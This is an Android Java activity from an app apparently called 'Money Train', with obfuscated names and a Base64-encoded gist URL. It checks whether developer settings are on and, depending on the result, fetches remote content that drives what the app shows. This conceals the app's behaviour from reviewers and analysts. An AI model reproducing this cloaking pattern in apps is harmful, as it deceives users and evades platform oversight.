package com.mmoonney.ttrain.oeres;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;


import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class MT extends Activity {

    public static String jfjsew;
    public static String ufbsfeu;
    public static String kfhjsue;
    public static String ufhshw;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.mt);

        AcWeWe.Wwweee.mt = this;
        int dsaq = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);

        if (dsaq == StarRRR.sd){

            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    try {


                        HttpURLConnection oijs = (HttpURLConnection) new URL(StarRRR.stdde("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzIwNTY1NzlkOTViY2JjYjFlZWIxMzNkOTE4M2UyZmJkL3Jhdy9Nb25leV9UcmFpbg==")).openConnection();
                        BufferedReader iusah = new BufferedReader(new InputStreamReader(oijs.getInputStream()));
                        String idj = iusah.readLine();
                        One.udn(idj);

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {

                                One.ffe(MT.this);

                            }
                        });


                    }catch (Exception e){
                        startActivity(new Intent(getApplicationContext(),StarRRR.class));
                        finishAffinity();
                    }

                }
            }).start();

        }else {

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    startActivity(new Intent(getApplicationContext(),StarRRR.class));
                    finishAffinity();
                }
            },1000);
        }


    }

}
